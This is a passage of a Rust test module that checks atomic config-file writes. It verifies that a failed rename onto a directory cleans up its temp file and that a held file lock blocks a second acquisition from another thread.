        // (a file can never atomically replace a directory on any platform).
        fs::create_dir(&target).unwrap();

        let result = persist_atomic(&target, b"{}");
        assert!(result.is_err(), "rename onto a directory must fail");

        let leftover: Vec<_> = fs::read_dir(dir.path())
            .unwrap()
            .filter_map(Result::ok)
            .filter(|e| e.file_name().to_string_lossy().contains(".tmp."))
            .collect();
        assert!(
            leftover.is_empty(),
            "temp file must be cleaned up on a failed rename, found: {leftover:?}"
        );
    }

    #[test]
    #[serial_test::serial]
    fn file_lock_blocks_a_second_independent_acquisition_on_the_same_path() {
        let dir = TempDir::new().expect("temp dir");
        let _guard = set_config_dir_override(dir.path().to_path_buf());
        let file: ConfigFile<CounterDoc> = ConfigFile::new("doc.json");

        let held = file
            .acquire_file_lock()
            .expect("first acquisition succeeds");

        let other: ConfigFile<CounterDoc> = ConfigFile::new("doc.json");
        let (tx, rx) = std::sync::mpsc::channel();
        let handle = std::thread::spawn(move || {
            let _second = other.acquire_file_lock().expect("eventually acquires");
            tx.send(()).unwrap();
        });

        let got_it_fast = rx
            .recv_timeout(std::time::Duration::from_millis(200))
            .is_ok();
        assert!(
            !got_it_fast,
            "a second lock acquisition must block while the first is held"
        );

        drop(held);
        handle.join().unwrap();
    }
}
